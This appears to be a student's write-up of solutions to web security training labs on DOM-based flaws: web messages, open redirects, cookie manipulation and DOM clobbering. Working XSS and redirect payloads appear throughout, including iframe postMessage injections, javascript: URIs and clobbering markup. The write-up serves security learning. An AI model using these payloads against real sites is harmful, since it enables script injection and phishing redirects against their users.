# Reflected data
This section was all solved already during the XSS week

# Stored data
This section was all solved already

# Web messages
1. This lab has a simple web message vulnerability where it takes the contents of the message and sets an elements `innerHtml` to equal it. This results in XSS as a result of the following payload:
```
<iframe src=https://ac721f761fa3a4cfc030a05700640087.web-security-academy.net/ onload="this.contentWindow.postMessage('<img src=x onerror=print()>','*')">
```
2. This lab is the same as the above, but instead of XSS it has an open redirect. The open redirect can be tricked into using a `javascript:` URI scheme however, so XSS can still be performed with the following payload:
```
<iframe src=https://acc11faa1eebf8b9c089105b00280040.web-security-academy.net/ onload="this.contentWindow.postMessage('javascript:print();//https:','*')">
```
3. This lab is the same as the above, but it requires setting up a JSON object with the correct fields in order to trigger the open redirect. The following payload can be used:
```
<iframe src=https://acb11ff21e9984a5c07b0ce800a70033.web-security-academy.net/ onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>
```

# DOM XSS
Already done

# Open redirection
1. This lab has an open redirection where the `Back` button uses the `url` GET parameter. As a result, the following payload will make the back button return users to the exploit server: `https://ac491fef1f16d1eac0e43ec700f300fa.web-security-academy.net/post?postId=2&url=https://exploit-ac991f991f90d1a2c0243ec701b900e8.web-security-academy.net/`

# Cookie manipulation
1. This lab uses the URL to set a cookie's value, and then reflects that cookie within an HTML `<a>` tag. This can be exploited to create a poisoned cookie that will cause XSS on the next page load. Using iframes, this series of loads can be done automatically and in the background on a different malicious site, without the user ever knowing that the XSS had happened. The following payload is an example of this:
```
<iframe src=https://ac4e1f251ec6aa3ac02d1a1100670036.web-security-academy.net/product?productId=1&%27%3E%3Cimg%20src=x%20onerror=print()%3E onload="if(!window.x)this.src='https://ac4e1f251ec6aa3ac02d1a1100670036.web-security-academy.net';window.x=1">
```

# DOM clobbering
1. This lab uses the DOM in order to load a user's avatar image (or use a default one in the case that there is none). We can use HTML tags in order to clobber the DOM to override the default avatar location in order to be a XSS payload with the following comment text: `<a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//">`
2. This lab involves an HTML sanitization library to allow HTML within post comments, but with a whitelist of allowed attributes. By clobbering the `attributes` property of an element on the page, we can smuggle attributes passed the filter and perform XSS. We set up the clobbering with the following comment:
```
<form id=xss tabindex=0 onfocus=print()><input id=attributes>
```
When this form is focused, it will trigger the XSS payload. In order to do this, we use the following iframe on the exploit server:
```
<iframe src=https://ace31f391fb26968c03b29e40019007c.web-security-academy.net/post?postId=1 onload="setTimeout(()=>this.src+='#xss',500)">
```
This iframe will load the page with the clobbered element, wait 500 ms for the comment to load, then use a URL fragment to automatically focus on the XSS form element
